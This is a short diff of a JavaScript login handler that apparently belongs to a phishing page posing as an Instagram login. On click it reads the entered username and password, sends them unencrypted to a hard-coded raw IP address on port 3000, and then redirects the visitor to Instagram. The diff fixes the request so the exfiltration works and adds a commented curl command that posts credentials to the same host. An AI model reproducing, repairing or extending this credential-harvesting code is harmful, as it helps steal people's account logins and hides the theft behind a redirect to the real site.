@@ -34,11 +34,15 @@ function logInOnClick() {
     var passwordInputText = document.getElementById("password-input-box").value;
     alert(usernameInputText + ", " + passwordInputText);
     const xhr = new XMLHttpRequest();
-    xhr.open("POST", "23.233.39.254:3000/userinfo", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.send(JSON.stringify({
-        username: usernameInputText,
-        passowrd: passwordInputText
-    }));
+    xhr.open("POST", "http://23.233.39.254:3000/userinfo", true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send("username=" + usernameInputText + "&password=" + passwordInputText);
+    xhr.onreadystatechange = (e) => {
+        console.log("bruh");
+    }
     document.location.href = "instagram.com";
+
+    /*
+    curl --header "Content-Type: application/json" --request POST --data '{"username":"xyz","password":"xyz"}' http://23.233.39.254:3000/userinfo
+  */
 }
